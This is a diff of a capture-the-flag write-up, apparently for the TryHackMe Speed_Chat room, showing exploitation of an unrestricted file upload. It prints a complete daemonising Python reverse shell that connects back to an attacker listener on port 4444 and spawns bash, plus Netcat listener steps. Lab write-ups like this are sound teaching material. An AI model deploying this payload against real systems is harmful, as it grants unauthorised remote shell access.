@@ -22,9 +22,10 @@ Because the application fails to restrict file uploads strictly to image types (
 ![HTML Inspector View](Screenshot%202026-11-09%20034400.png)
 ### **3. Exploitation (Remote Code Execution)**
 To exploit this unrestricted upload vulnerability, a custom Python script (`rev.py`) was prepared to initiate a reverse socket connection back to the attacker's listener upon execution.
+![Python Reverse Shell Code](Screenshot%202026-11-09%20034106.png)
 #### **Payload (**`rev.py`**):**
 `import socket, subprocess, os, pty, sys, time`  `IP = "192.168.192.106"` `PORT = 4444`  `def connect_and_spawn():` `    while True:` `        try:` `            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)` `            s.connect((IP, PORT))` `            os.dup2(s.fileno(), 0)` `            os.dup2(s.fileno(), 1)` `            os.dup2(s.fileno(), 2)` `            pty.spawn("/bin/bash")` `            s.close()` `            break` `        except Exception:` `            time.sleep(3)` `            continue`  `try:` `    pid = os.fork()` `    if pid > 0:` `        sys.exit(0)` `except OSError:` `    sys.exit(1)`  `os.setsid()`  `try:` `    pid = os.fork()` `    if pid > 0:` `        sys.exit(0)` `except OSError:` `    sys.exit(1)`  `connect_and_spawn()`
-
+![Profile Update Interface](Screenshot%202026-11-09%20034136.png)
  
 ### **4. Gaining Access & Flag Retrieval**
 1. Start a Netcat listener on the attack machine listening on port `4444`:
@@ -38,6 +39,7 @@ To exploit this unrestricted upload vulnerability, a custom Python script (`rev.
 3. Navigate to `/opt/Speed_Chat` and retrieve the flag (`flag.txt`).
 
 `THM{``********************************}`
+![Netcat Listener and Flag Retrieval](Screenshot%202026-11-09%20033449.png)
 
 ## **Remediation & Countermeasures**
 To mitigate this vulnerability, the application should implement the following security controls:
